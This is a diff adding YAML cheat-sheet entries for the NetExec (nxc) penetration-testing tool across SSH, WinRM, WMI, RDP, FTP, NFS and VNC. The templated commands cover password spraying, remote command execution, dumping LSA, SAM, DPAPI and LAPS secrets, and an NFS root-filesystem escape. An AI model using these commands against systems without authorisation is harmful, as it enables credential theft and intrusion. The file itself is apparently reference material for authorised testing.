+  # ============================================================================
+  # SSH PROTOCOL
+  # ============================================================================
+
+  - title: nxc ssh - basic authentication
+    desc: |
+      Authenticate to SSH server with username and password. Tests SSH credentials.
+      Shows SSH version and authentication result.
+    command: "nxc ssh {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc ssh - specify custom port
+    desc: |
+      Connect to SSH on custom port. Default is 22. Use --port for non-standard
+      SSH ports.
+    command: "nxc ssh {{target}} --port {{port|2222}}"
+
+  - title: nxc ssh - execute command
+    desc: |
+      Execute command on remote system via SSH. Runs command and displays output.
+      Shows (Pwn3d!) when root access is obtained.
+    command: "nxc ssh {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
+
+  - title: nxc ssh - password spray
+    desc: |
+      Password spray against SSH servers. Tests credentials against multiple
+      SSH hosts. Watch for account lockouts!
+    command: "nxc ssh {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc ssh - get file from remote
+    desc: |
+      Download file from remote system via SCP. Transfers file from remote
+      to local system using SSH/SCP.
+    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/tmp/file.txt}} {{local_path|/tmp/file.txt}}"
+
+  - title: nxc ssh - put file to remote
+    desc: |
+      Upload file to remote system via SCP. Transfers local file to remote
+      system using SSH/SCP.
+    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/tmp/file.txt}}"
+
+  # ============================================================================
+  # WinRM PROTOCOL
+  # ============================================================================
+
+  - title: nxc winrm - basic authentication
+    desc: |
+      Authenticate to WinRM service with username and password. Tests WinRM
+      credentials. Shows (Pwn3d!) when code execution is possible.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc winrm - authenticate with domain
+    desc: |
+      Authenticate to WinRM with domain when SMB port is closed. Use -d flag
+      to specify domain and avoid SMB connection.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
+
+  - title: nxc winrm - execute command
+    desc: |
+      Execute command on remote system via WinRM. Runs PowerShell command and
+      displays output. Shows (Pwn3d!) on success.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -X {{command|whoami}}"
+
+  - title: nxc winrm - password spray
+    desc: |
+      Password spray against WinRM services. Tests credentials against multiple
+      WinRM hosts. Use --no-bruteforce for 1:1 user:password mapping.
+    command: "nxc winrm {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc winrm - dump LSA secrets
+    desc: |
+      Dump LSA secrets from remote system via WinRM. Extracts cached credentials
+      and service account passwords. Requires admin privileges.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M lsassy"
+
+  - title: nxc winrm - dump SAM database
+    desc: |
+      Dump SAM database from remote system via WinRM. Extracts local account
+      password hashes. Requires SYSTEM privileges.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M sam"
+
+  - title: nxc winrm - dump DPAPI secrets
+    desc: |
+      Dump DPAPI secrets from remote system via WinRM. Extracts encrypted
+      credentials stored by Windows applications.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M dpapi"
+
+  - title: nxc winrm - defeat LAPS
+    desc: |
+      Extract LAPS passwords via WinRM. Retrieves managed local admin passwords
+      from domain through WinRM.
+    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M laps"
+
+  # ============================================================================
+  # WMI PROTOCOL
+  # ============================================================================
+
+  - title: nxc wmi - authenticate Windows auth
+    desc: |
+      Authenticate to WMI using Windows authentication. Default authentication
+      method. Uses Windows credentials for WMI access.
+    command: "nxc wmi {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc wmi - authenticate Windows auth with domain
+    desc: |
+      Authenticate to WMI with Windows auth when SMB port is closed. Specify
+      domain with -d flag to avoid SMB connection.
+    command: "nxc wmi {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
+
+  - title: nxc wmi - authenticate local auth
+    desc: |
+      Authenticate to WMI using local authentication. Use --local-auth flag
+      for local account instead of domain account.
+    command: "nxc wmi {{target}} -u {{username}} -p {{password}} --local-auth"
+
+  - title: nxc wmi - execute command
+    desc: |
+      Execute command on remote system via WMI. Runs command through WMI
+      and displays output. Shows (Pwn3d!) when local admin access is obtained.
+    command: "nxc wmi {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
+
+  - title: nxc wmi - password spray
+    desc: |
+      Password spray against WMI services. Tests credentials against multiple
+      WMI hosts. Use --no-bruteforce for 1:1 user:password mapping.
+    command: "nxc wmi {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  # ============================================================================
+  # RDP PROTOCOL
+  # ============================================================================
+
+  - title: nxc rdp - basic authentication
+    desc: |
+      Authenticate to RDP service with username and password. Tests RDP
+      credentials. Shows (Pwn3d!) when code execution is possible.
+    command: "nxc rdp {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc rdp - password spray
+    desc: |
+      Password spray against RDP services. Tests credentials against multiple
+      RDP hosts. Watch for account lockouts!
+    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc rdp - password spray without bruteforce
+    desc: |
+      Password spray with 1:1 user:password mapping. Each user gets matched
+      with corresponding password from file. user1=>pass1, user2=>pass2.
+    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
+
+  - title: nxc rdp - execute command
+    desc: |
+      Execute command on remote system via RDP. Runs command through RDP
+      session. Shows (Pwn3d!) on success.
+    command: "nxc rdp {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
+
+  - title: nxc rdp - take screenshot (connected)
+    desc: |
+      Take screenshot of RDP session when connected. Captures screen of active
+      RDP session. Useful for reconnaissance.
+    command: "nxc rdp {{target}} -u {{username}} -p {{password}} --screenshot"
+
+  - title: nxc rdp - take screenshot (without NLA, not connected)
+    desc: |
+      Take screenshot without NLA when not connected. Attempts to capture
+      login screen on RDP servers with NLA disabled.
+    command: "nxc rdp {{target}} --screenshot-no-nla"
+
+  # ============================================================================
+  # FTP PROTOCOL
+  # ============================================================================
+
+  - title: nxc ftp - basic authentication
+    desc: |
+      Authenticate to FTP server with username and password. Tests FTP
+      credentials. No (Pwn3d!) check for FTP protocol.
+    command: "nxc ftp {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc ftp - password spray
+    desc: |
+      Password spray against FTP servers. Tests credentials against multiple
+      FTP hosts. Use --no-bruteforce for 1:1 user:password mapping.
+    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
+
+  - title: nxc ftp - password spray with continue on success
+    desc: |
+      Password spray continuing after successful login. Useful for spraying
+      single password against large user list.
+    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"
+
+  - title: nxc ftp - list files
+    desc: |
+      List files on FTP server. Enumerates files and directories in FTP
+      share. Useful for reconnaissance.
+    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --list"
+
+  - title: nxc ftp - get file from remote
+    desc: |
+      Download file from FTP server. Transfers file from remote to local
+      system via FTP.
+    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"
+
+  - title: nxc ftp - put file to remote
+    desc: |
+      Upload file to FTP server. Transfers local file to remote system via FTP.
+    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"
+
+  # ============================================================================
+  # NFS PROTOCOL
+  # ============================================================================
+
+  - title: nxc nfs - enumerate NFS server
+    desc: |
+      Enumerate NFS server information. Detects supported NFS versions and
+      checks for root escape vulnerability.
+    command: "nxc nfs {{target}}"
+
+  - title: nxc nfs - enumerate shares
+    desc: |
+      Enumerate exported NFS shares. Lists all available NFS shares with
+      permissions, storage usage, and access lists.
+    command: "nxc nfs {{target}} --shares"
+
+  - title: nxc nfs - list files on share
+    desc: |
+      List files on specific NFS share. Shows files and directories in
+      specified share path.
+    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --ls {{path|/}}"
+
+  - title: nxc nfs - enumerate shares recursively
+    desc: |
+      Enumerate all files recursively on NFS shares. Recursively discovers
+      files and folders with specified depth (default 3).
+    command: "nxc nfs {{target}} --enum-shares"
+
+  - title: nxc nfs - enumerate with custom depth
+    desc: |
+      Enumerate shares with custom recursion depth. Specify depth for
+      recursive enumeration (default is 3 layers).
+    command: "nxc nfs {{target}} --enum-shares {{depth|5}}"
+
+  - title: nxc nfs - download file
+    desc: |
+      Download file from NFS share. Transfers file from remote NFS share
+      to local system.
+    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"
+
+  - title: nxc nfs - upload file
+    desc: |
+      Upload file to NFS share. Transfers local file to remote NFS share.
+    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"
+
+  - title: nxc nfs - escape to root filesystem
+    desc: |
+      Attempt root filesystem escape on NFS. Exploits NFS misconfiguration
+      to access root filesystem. Requires root escape vulnerability.
+    command: "nxc nfs {{target}} --root-escape"
+
+  # ============================================================================
+  # VNC PROTOCOL
+  # ============================================================================
+
+  - title: nxc vnc - basic authentication
+    desc: |
+      Authenticate to VNC server with password. Tests VNC credentials.
+      Shows (Pwn3d!) when code execution is possible.
+    command: "nxc vnc {{target}} -p {{password}}"
+
+  - title: nxc vnc - password spray
+    desc: |
+      Password spray against VNC servers. Tests passwords against multiple
+      VNC hosts.
+    command: "nxc vnc {{target}} -p {{passwords_file|~/passwords.txt}}"
+
